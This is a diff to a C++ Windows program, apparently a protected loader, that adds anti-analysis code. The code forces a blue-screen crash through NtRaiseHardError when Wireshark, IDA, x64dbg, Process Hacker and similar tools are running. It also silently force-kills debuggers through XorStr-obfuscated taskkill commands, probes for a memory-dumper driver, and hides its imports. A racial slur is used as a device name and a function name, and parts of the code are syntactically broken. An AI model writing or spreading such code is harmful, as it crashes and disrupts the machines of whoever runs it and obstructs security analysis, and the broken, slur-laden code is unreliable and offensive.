@@ -6,6 +6,9 @@
 #include <urlmon.h>
 #include "XorStr.hpp"
 #pragma comment (lib, "urlmon.lib")
+bool running = true;
+typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
+typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
 
 using namespace std;
 
@@ -19,12 +22,153 @@ std::string RandomString(const size_t length)
 		r += bet[rand() % (sizeof(bet) - 1)];
 	return r;
 }
+DWORD FindProcessId2(const std::wstring& processName)
+{
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+    auto createtoolhelp = LI_FN(CreateToolhelp32Snapshot);
+    HANDLE processesSnapshot = createtoolhelp(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE)
+        return 0;
 
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile))
+    {
+        auto closehand = LI_FN(CloseHandle);
+        closehand(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo))
+    {
+        if (!processName.compare(processInfo.szExeFile))
+        {
+            auto closehand = LI_FN(CloseHandle);
+            closehand(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    return 0;
+}
+void bsod()
+{
+    BOOLEAN bEnabled;
+    ULONG uResp;
+    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
+    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
+    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
+    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
+    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
+    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
+}
+void killdbg()
+{
+    system(XorStr("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
+    system(XorStr("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
+    system(XorStr("taskkill /f /im Ida64.exe >nul 2>&1").c_str());
+    system(XorStr("taskkill /f /im OllyDbg.exe >nul 2>&1").c_str());
+    system(XorStr("taskkill /f /im Dbg64.exe >nul 2>&1").c_str());
+    system(XorStr("taskkill /f /im Dbg32.exe >nul 2>&1").c_str());
+    system(XorStr("sc stop HTTPDebuggerPro >nul 2>&1").c_str());
+    system(XorStr("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1").c_str());
+    system(XorStr("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1").c_str());
+    system(XorStr("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1").c_str());
+}
+void driverdetect()
+{
+    const TCHAR* devices[] = {
+(XorStr(_T("\\\\.\\NiGgEr")).c_str()),
+(XorStr(_T("\\\\.\\KsDumper")).c_str())
+    };
+
+    WORD iLength = sizeof(devices) / sizeof(devices[0]);
+    for (int i = 0; i < iLength; i++)
+    {
+        HANDLE hFile = CreateFile(devices[i], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        TCHAR msg[256] = _T("");
+        if (hFile != INVALID_HANDLE_VALUE) {
+            system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Protection && ECHO KsDumper Detected. && TIMEOUT 10 >nul").c_str());
+            exit(0);
+        }
+        else
+        {
+            return(0)
+        }
+    }
+}
+void exedetect()
+{
+    if (FindProcessId(s2ws("KsDumperClient.exe")) != 0)
+    {
+        bsod();
+    }
+    else if (FindProcessId(s2ws("HTTPDebuggerUI.exe")) != 0)
+    {
+        bsod();
+    }
+    else if (FindProcessId(s2ws("HTTPDebuggerSvc.exe")) != 0)
+    {
+        bsod();
+    }
+    else if (FindProcessId(s2ws("FolderChangesView.exe")) != 0)
+    {
+        bsod();
+    }
+    else if (FindProcessId(s2ws("ProcessHacker.exe")) != 0)
+    {
+        bsod();
+    }
+    else if (FindProcessId(s2ws("procmon.exe")) != 0)
+    {
+        bsod();
+    }
+    else if (FindProcessId(s2ws("idaq.exe")) != 0)
+    {
+        bsod();
+    }
+    else if (FindProcessId(s2ws("idaq64.exe")) != 0)
+    {
+        bsod();
+    }
+    else if (FindProcessId(s2ws("Wireshark.exe")) != 0)
+    {
+        bsod();
+    }
+    else if (FindProcessId(s2ws("Fiddler.exe")) != 0)
+    {
+        bsod();
+    }
+    else if (FindProcessId(s2ws("Xenos64.exe")) != 0)
+    {
+        bsod();
+    }
+    else if (FindProcessId(s2ws("Cheat Engine.exe")) != 0)
+    {
+        bsod();
+    }
+    else if (FindProcessId(s2ws("HTTP Debugger Windows Service (32 bit).exe")) != 0)
+    {
+        bsod();
+    }
+    else if (FindProcessId(s2ws("KsDumper.exe")) != 0)
+    {
+        bsod();
+    }
+    else if (FindProcessId(s2ws("x64dbg.exe")) != 0)
+    {
+        bsod();
+    }
+}
 DWORD Nigger(LPVOID in) {
 	while (1)
 	{
-		Sleep(850);
+		 
+        	exedetect();
+       		titledetect();
+        	driverdetect();
 		SetConsoleTitle(RandomString(16).c_str());
+		killdbg();
 	}
 }
 
